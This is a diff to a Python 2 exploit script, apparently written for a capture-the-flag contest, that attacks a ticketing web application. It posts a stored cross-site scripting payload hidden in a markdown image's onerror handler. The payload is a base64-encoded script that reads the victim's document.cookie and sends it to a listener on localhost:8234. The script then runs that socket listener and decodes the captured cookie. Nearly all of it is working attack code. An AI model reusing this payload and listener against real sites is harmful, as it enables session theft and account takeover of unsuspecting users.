@@ -9,7 +9,7 @@ from pyquery import PyQuery as PQ
 import string
 import random
 import re
-
+import base64
 class WebExp:
     def __init__(self, ip, port, csrfname = '_xsrf'):
         self.ip = ip
@@ -118,23 +118,37 @@ class WebExp:
         self.login_test()
 
         rs = self.session.get(self.url + 'tickets')
-        token = self._get_token(rs.text)
+        #token = self._get_token(rs.text)
         payload = '![dsa](x"onerror=eval(atob(\'Yj1kb2N1bWVudC5jb29raWU7YT0iPGltZyBzcmM9aHR0cDovL2xvY2FsaG9zdDo4MjM0LyIrYnRvYShiKSsiPiI7ZG9jdW1lbnQud3JpdGUoYSk7\'))%")'
-        print self.url + 'tickets/create'
+        #print self.url + 'tickets/create'
+        rs=self.session.get(self.url + 'tickets/create')
+        token=self._get_token(rs.text)
+        #print token
         rs = self.session.post(url=self.url + 'tickets/create', data={
             self.csrfname: token,
             "title": "hhh",
             "wmd-input": payload
         })
-        print rs.text
+        print rs.status_code
 
         s = socket.socket()
         s.bind(("127.0.0.1", 8234))
         s.listen(5)
         print("start listening ...")
         while True:
-            tmp = s.accept()
-            print(tmp, "\n\n")
+            con,address = s.accept()
+            buf=con.recv(1024)
+            if 'GET' in buf:
+                break
+        #print buf
+        cookie=re.search(r'/\w+=*\s',buf).string
+        cookie=cookie.strip().split('/')[1]
+        cookie=base64.b64decode(cookie)
+        #print cookie
+        value=re.search(r'"(.+)"', cookie)
+        if value:
+            value.group(1)
+
         return True
 
 def exp(host, port):
